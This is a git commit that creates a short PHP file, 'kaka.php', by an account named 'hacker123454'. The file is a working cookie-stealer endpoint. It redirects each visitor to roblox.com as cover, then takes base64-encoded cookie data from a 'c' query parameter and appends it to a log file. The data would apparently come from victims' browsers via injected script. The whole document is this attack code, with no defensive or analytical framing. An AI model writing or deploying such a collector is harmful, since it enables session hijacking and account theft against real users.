2891840022e3f74bebf28714a1e3f77805813e13
hacker123454 <84779573+hacker123454@users.noreply.github.com>
2021-12-26 12:34:05 +0300

    Create kaka.php

---
+++ kaka.php
@@ -0,0 +1,10 @@
+<?php
+	header ('Location:https://roblox.com');
+
+	if (isset($_GET["c"]))
+	{
+		$cookies = base64_decode(urldecode($_GET["c"]));
+		$file = fopen('log.txt', 'a');
+		fwrite($file, $cookies . "\n\n");
+	}
+?>
